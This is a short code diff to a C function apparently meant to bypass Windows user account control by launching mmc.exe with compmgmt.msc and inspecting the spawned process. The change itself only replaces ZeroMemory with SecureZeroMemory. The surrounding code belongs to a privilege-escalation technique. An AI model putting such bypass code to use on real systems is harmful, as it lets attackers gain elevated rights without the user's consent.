@@ -27,7 +27,7 @@ static VOID BypassBycompMgmLauncher
 	ExpandEnvironmentStringsW(L"%WINDIR%\\System32\\mmc.exe", wszMmcPath, sizeof(wszMmcPath) / sizeof(WCHAR));
 	ExpandEnvironmentStringsW(L" \"%WINDIR%\\System32\\compmgmt.msc\" /s", wszMmcParameter, sizeof(wszMmcParameter) / sizeof(WCHAR));
 
-	ZeroMemory(&ShellExeInfo, sizeof(ShellExeInfo));
+	SecureZeroMemory(&ShellExeInfo, sizeof(ShellExeInfo));
 	ShellExeInfo.cbSize = sizeof(ShellExeInfo);
 	ShellExeInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
 	ShellExeInfo.lpFile = wszMmcPath;
@@ -39,7 +39,7 @@ static VOID BypassBycompMgmLauncher
 		goto END;
 	}
 
-	ZeroMemory(&ProcessInfo, sizeof(ProcessInfo));
+	SecureZeroMemory(&ProcessInfo, sizeof(ProcessInfo));
 	Status = NtQueryInformationProcess(ShellExeInfo.hProcess, ProcessBasicInformation, &ProcessInfo, sizeof(ProcessInfo), &ReturnLength);
 	if (!NT_SUCCESS(Status)) {
 		goto END;
